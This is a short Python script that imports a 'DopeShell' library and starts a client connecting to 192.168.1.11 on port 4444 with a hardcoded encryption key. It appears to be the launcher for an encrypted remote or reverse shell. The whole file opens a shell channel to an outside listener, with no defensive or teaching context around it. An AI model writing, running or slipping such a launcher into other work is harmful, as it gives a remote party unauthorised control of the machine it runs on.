from DopeShell import DopeShellclient

key = b'myverystrongpasswordo32bitlength'

server = DopeShellclient('192.168.1.11', 4444, key)
server.run()
